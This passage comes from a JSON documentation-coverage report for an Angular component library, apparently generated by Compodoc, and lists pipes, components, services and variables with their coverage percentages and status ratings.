                "status": "medium"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "CurrencyFormatPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "DateFormatPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "KeysPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "NumberFormatPipe",
                "coveragePercent": 100,
                "coverageCount": "1/1",
                "status": "very-good"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ExcludeUnit",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/with-unit.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "GetUnit",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-pipes/yes-no.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "YesNoPipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoUserPreferenceComponent",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "StoUserPreferenceService",
                "coveragePercent": 0,
                "coverageCount": "0/8",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/sto-user-preference/sto-user-preference.service.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "preferenceKey",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "component",
                "linktype": "component",
                "name": "DialogDemoComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoCard",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoDialog",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoGrid",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/lib/styles.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "StoTheme",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/core/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Actionbar",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "AutoSize",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "MultilineFooter",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Paging",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable-custom.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ResponsiveMode",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/datatable.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "columns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "fixedColumns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "manyColumns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "pipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/rows.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "rows",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ColumnStylePipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Column",
                "coveragePercent": 0,
                "coverageCount": "0/16",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/columns.ts",
                "type": "class",
                "linktype": "classe",
                "name": "ColumnGroup",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "Activate",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ContextMenu",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowActivation",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowCtx",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/events.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "RowSelection",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "ExecPipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/models.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "SortColumn",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableActionsComponent",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDataTableActionsLeftComponent",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-actions/sto-datatable-actions.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDataTableActionsRightComponent",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body-row/sto-datatable-body-row.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableBodyRowComponent",
                "coveragePercent": 0,
                "coverageCount": "0/15",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-body/sto-datatable-body.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableBodyComponent",
                "coveragePercent": 0,
                "coverageCount": "0/43",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableHeaderGroupComponent",
                "coveragePercent": 0,
                "coverageCount": "0/8",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableHeaderComponent",
                "coveragePercent": 0,
                "coverageCount": "0/26",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-resize.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "StoDatatableResizeDirective",
                "coveragePercent": 0,
                "coverageCount": "0/17",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/sto-datatable/sto-datatable.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDatatableComponent",
                "coveragePercent": 0,
                "coverageCount": "0/62",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/lib/swimlane-table.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/testing/utils.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "columns",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/datatable/src/testing/utils.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "rows",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/drawer.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-footer.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDrawerFooterComponent",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-header.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDrawerHeaderComponent",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDrawerWrapperComponent",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-drawer/sto-drawer.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoDrawerComponent",
                "coveragePercent": 45,
                "coverageCount": "15/33",
                "status": "medium"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "MenuGroup",
                "coveragePercent": 0,
                "coverageCount": "0/6",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "MenuItem",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "MenuItemCommand",
                "coveragePercent": 33,
                "coverageCount": "1/3",
                "status": "medium"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "NavigateCommand",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu-item/navigation-menu-item.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "NavigationMenuItemComponent",
                "coveragePercent": 0,
                "coverageCount": "0/7",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-menu/navigation-menu.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "NavigationMenuComponent",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation-part/navigation-part.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "NavigationPartComponent",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "navigation",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/navigation.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "subNavigation",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/lib/sto-navigation/tokens.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "USE_HASH_ROUTING",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/drawer/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "NormalUse",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/dialog/dialog.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "DialogComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-dialog.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ErrorDialogService",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.service.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ErrorHandlerService",
                "coveragePercent": 14,
                "coverageCount": "2/14",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ErrorHandler",
                "coveragePercent": 33,
                "coverageCount": "1/3",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "ErrorLogger",
                "coveragePercent": 50,
                "coverageCount": "1/2",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/error-handler.ts",
                "type": "interface",
                "linktype": "interface",
                "name": "StoErrorHandler",
                "coveragePercent": 50,
                "coverageCount": "1/2",
                "status": "medium"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Action",
                "coveragePercent": 80,
                "coverageCount": "4/5",
                "status": "very-good"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/http-error.ts",
                "type": "class",
                "linktype": "classe",
                "name": "HttpError",
                "coveragePercent": 14,
                "coverageCount": "1/7",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "CUSTOM_ERROR_HANDLER",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/error-handler/token.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "ERROR_LOGGER",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/wrapper.ts",
                "type": "component",
                "linktype": "component",
                "name": "NextWrapperComponent",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/wrapper.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "ErrorHandlerImpl",
                "coveragePercent": 0,
                "coverageCount": "0/2",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/wrapper.ts",
                "type": "injectable",
                "linktype": "injectable",
                "name": "Logger",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/lib/wrapper.ts",
                "type": "function",
                "linksubtype": "function",
                "name": "LoggerFactory",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/error-handler/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "NumberInputDirective",
                "coveragePercent": 52,
                "coverageCount": "12/23",
                "status": "good"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
                "type": "pipe",
                "linktype": "pipe",
                "name": "NumberInputPipe",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input.pipe.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "PADDING",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "NumberInputComponent",
                "coveragePercent": 3,
                "coverageCount": "2/52",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "NumberUnitInputComponent",
                "coveragePercent": 3,
                "coverageCount": "2/54",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
                "type": "class",
                "linktype": "classe",
                "name": "NumberUnit",
                "coveragePercent": 0,
                "coverageCount": "0/3",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "control",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/number-input/value-unit-input.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "SlideToggleComponent",
                "coveragePercent": 0,
                "coverageCount": "0/36",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-form/form-field.base.ts",
                "type": "class",
                "linktype": "classe",
                "name": "FormFieldBase",
                "coveragePercent": 18,
                "coverageCount": "2/11",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-form/form-field.directive.ts",
                "type": "directive",
                "linktype": "directive",
                "name": "FormFieldDirective",
                "coveragePercent": 0,
                "coverageCount": "0/8",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-form/form-field.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-select-filter/item-list.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "items",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "MultiSelect",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-select-filter/mat-select-filter.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "SingleSelect",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-select-filter/sto-select-filter.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "StoSelectFilterComponent",
                "coveragePercent": 32,
                "coverageCount": "9/28",
                "status": "medium"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
                "type": "class",
                "linktype": "classe",
                "name": "Modifiers",
                "coveragePercent": 0,
                "coverageCount": "0/5",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "validCommands",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-actions/wysiwyg-actions.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygActionsComponent",
                "coveragePercent": 0,
                "coverageCount": "0/4",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg-editor/wysiwyg-editor.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygEditorComponent",
                "coveragePercent": 0,
                "coverageCount": "0/16",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.component.ts",
                "type": "component",
                "linktype": "component",
                "name": "WysiwygComponent",
                "coveragePercent": 0,
                "coverageCount": "0/19",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Template",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "unsanitized",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "Usage",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "context",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "libs/form/src/test.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "require",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "function",
                "linksubtype": "function",
                "name": "processScss",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "importer",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "out",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "promises",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
                "linktype": "miscellaneous",
                "linksubtype": "variable",
                "name": "root",
                "coveragePercent": 0,
                "coverageCount": "0/1",
                "status": "low"
            },
            {
                "filePath": "tools/scripts/build-scss.ts",
                "type": "variable",
